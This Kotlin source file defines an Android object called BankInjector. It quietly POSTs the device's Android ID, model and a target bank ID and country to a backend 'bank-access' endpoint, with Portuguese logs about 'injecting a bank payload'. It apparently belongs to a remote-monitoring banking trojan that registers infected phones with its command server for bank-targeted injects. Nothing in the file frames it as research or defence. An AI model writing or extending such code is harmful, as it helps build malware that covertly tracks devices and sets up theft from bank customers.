package com.remotemonitor.test

import android.content.Context
import android.util.Log
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

object BankInjector {
    private const val TAG = "BankInjector"

    fun init(context: Context, bankId: String, bankCountry: String) {
        if (bankId.isBlank()) return

        Thread {
            try {
                injectBankPayload(context, bankId, bankCountry)
                Log.i(TAG, "Payload bancário injetado: $bankId")
            } catch (e: Exception) {
                Log.w(TAG, "Erro ao injetar payload bancário", e)
            }
        }.start()
    }

    private fun injectBankPayload(context: Context, bankId: String, bankCountry: String) {
        try {
            val androidId = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"

            val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/device/bank-access"
            val connection = URL(endpoint).openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.connectTimeout = 10_000
            connection.readTimeout = 10_000
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json")

            val payload = JSONObject().apply {
                put("packageName", BuildConfig.APPLICATION_ID)
                put("deviceUid", androidId)
                put("deviceName", android.os.Build.MODEL ?: "Android Device")
                put("model", android.os.Build.MODEL ?: "Android")
                put("bankId", bankId)
                put("bankCountry", bankCountry)
                put("injectedAt", System.currentTimeMillis())
            }

            OutputStreamWriter(connection.outputStream, Charsets.UTF_8).use {
                it.write(payload.toString())
            }

            val statusCode = connection.responseCode
            if (statusCode !in 200..299) {
                Log.w(TAG, "Bank inject retornou HTTP $statusCode")
            }
            connection.disconnect()
        } catch (error: Exception) {
            Log.w(TAG, "Falha ao injetar banco", error)
        }
    }
}
